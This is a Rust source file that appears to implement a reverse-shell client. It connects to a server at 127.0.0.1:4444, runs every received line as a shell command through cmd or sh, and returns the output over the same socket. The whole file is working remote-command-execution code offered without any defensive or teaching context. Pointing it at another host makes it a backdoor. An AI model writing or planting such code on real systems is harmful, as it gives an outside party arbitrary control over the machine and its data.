use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // Connect to the server
    let stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server at 127.0.0.1:4444");

    let mut reader = BufReader::new(stream.try_clone()?);
    let mut writer = stream;

    loop {
        // Read a command from the server (terminated by newline)
        let mut command_line = String::new();
        let bytes_read = reader.read_line(&mut command_line)?;

        // If the server closed the connection, exit
        if bytes_read == 0 {
            println!("Server closed the connection.");
            break;
        }

        let command_line = command_line.trim();
        if command_line.is_empty() {
            continue;
        }

        println!("Received command: {}", command_line);

        // Execute the command on the system
        // Use the appropriate shell for the platform
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", command_line]).output()
        } else {
            Command::new("sh").arg("-c").arg(command_line).output()
        };

        // Build the result string
        let result = match output {
            Ok(out) => {
                let mut combined = String::new();
                combined.push_str(&String::from_utf8_lossy(&out.stdout));
                combined.push_str(&String::from_utf8_lossy(&out.stderr));
                if combined.is_empty() {
                    combined.push_str(&format!(
                        "[command exited with status: {}]\n",
                        out.status
                    ));
                }
                combined
            }
            Err(e) => format!("[failed to execute command: {}]\n", e),
        };

        // Print the result locally
        print!("{}", result);

        // Send the result back to the server
        writer.write_all(result.as_bytes())?;
        // Marker so the server knows the response is done
        writer.write_all(b"---END---\n")?;
        writer.flush()?;
    }

    Ok(())
}

